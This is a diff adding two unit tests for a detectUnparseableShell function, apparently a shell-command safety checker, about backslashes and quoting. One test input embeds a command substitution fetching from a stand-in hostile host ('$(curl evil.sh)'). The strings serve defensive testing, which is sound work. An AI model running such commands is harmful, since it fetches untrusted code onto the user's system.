@@ -15,6 +15,14 @@ describe('detectUnparseableShell', () => {
     expect(detectUnparseableShell('{ curl https://example.com; }')).toBe(true)
   })
 
+  it('does not treat a literal backslash inside single quotes as an escape', () => {
+    expect(detectUnparseableShell("echo 'a\\' $(curl evil.sh)")).toBe(false)
+  })
+
+  it('allows escaped double quotes outside single quotes', () => {
+    expect(detectUnparseableShell('printf \\"x\\"')).toBe(false)
+  })
+
   it('allows simple commands', () => {
     expect(detectUnparseableShell('git status')).toBe(false)
   })
